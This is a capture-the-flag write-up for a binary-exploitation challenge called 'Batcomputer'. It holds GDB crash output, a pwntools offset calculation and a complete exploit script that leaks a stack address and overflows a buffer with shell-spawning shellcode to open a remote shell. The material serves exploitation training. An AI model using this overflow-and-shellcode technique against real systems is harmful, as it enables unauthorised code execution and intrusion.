### Batcomputer

GDB output :
```bash
gdb-peda$ r                                                                                                                                                                                          
Starting program: /home/nickapic/htb/challenges/batcomputer/batcomputer                                                                                                                              
Welcome to your BatComputer, Batman. What would you like to do?                                                                                                                                      
1. Track Joker                                                                                                                                                                                       
2. Chase Joker                                                                                                                                                                                       
> 2                                                                                                                                                                                                  
Ok. Let's do this. Enter the password: b4tp@$$w0rd!                                                                                                                                                  
Access Granted.                                                                                                                                                                                      
Enter the navigation commands: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabj                             
Roger that!                                                                                                                                                                                          
Welcome to your BatComputer, Batman. What would you like to do?                                                                                                                                      
1. Track Joker                                                                                                                                                                                       
2. Chase Joker                                                                                                                                                                                       
> 3
Too bad, now who's gonna save Gotham? Alfred?

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
RAX: 0x0
RBX: 0x0
RCX: 0x7ffff7ed2f33 (<__GI___libc_write+19>:    cmp    rax,0xfffffffffffff000)
RDX: 0x0
RSI: 0x7ffff7fa3723 --> 0xfa5670000000000a
RDI: 0x7ffff7fa5670 --> 0x0
RBP: 0x6161617561616174 ('taaauaaa')
RSP: 0x7fffffffd938 ("vaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabj^%U\260PUUUU")
RIP: 0x55555555531f (ret)
R8 : 0x2e ('.')
R9 : 0x0
R10: 0x7ffff7f55ac0 --> 0x100000000
R11: 0x246
R12: 0x5555555550b0 (endbr64)
R13: 0x0
R14: 0x0
R15: 0x0
EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)

```

Here the RIP would be overwritten by the first 4 characters shown to us in the RSP which in our case is "vaaa"

This is command prompt i used to create the cyclic variables and check what is the offset

```python
>>> import pwn
>>> pwn.cyclic(137)
b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabj'
>>> pwn.cyclic_find('vaaa')
84
```

Solution :
```python
from pwn import *

def main():
    context(os='linux', arch='amd64')
    io = remote('remote ip', remote port) # Connecting to a Remote IP and Port
    # First Step is to ennumerate
    password = 'b4tp@$$w0rd!' # Password we got from Ghidra
    return_address = 84 # GDB gave us the offset / the amount of bytes to overwrite the EIP

    # get stack address

    io.sendlineafter('> ', '1') # As the prompt starts like "> "  and asks for our input
    stack_address = io.recvline().strip().split()[-1]  # Get the last item of the output here which is ----------------- address
    stack_address = ''.join([chr(int(stack_address[i:i+2], 16)) for i in range(2, len(stack_address), 2)]) # To make the address  we get from this into bytes 0x12345678 to /x12/x34/x56/x78 etc.
    # To make sure the address is 8 bytes
    stack_address = stack_address.rjust(8, '\x00')
    stack_address = u64(stack_address, endian='big') # To make it easier to work with it with addition to the address and so on and we set it to little endian as we have LSB so Least Significant Bits first so big endian
    log.success(f'Gottem: {p64(stack_address)}' ) # Just logging to see if all is alright

    # Step 2 : Do Buffer Overflow
    io.sendlineafter('> ', '2')
    io.sendlineafter('password: ', password)
    shellcode = asm(shellcraft.popad() + shellcraft.sh())
    padding = b'a'* (return_address - len(shellcode))
    payload = shellcode + padding + p64(stack_address)   
    io.sendlineafter('commands: ', payload)
    # To Triger the fault we need to return so doing 3 we get the seg fault error
    io.sendlineafter('> ', '3')
    io.interactive()

main()
```
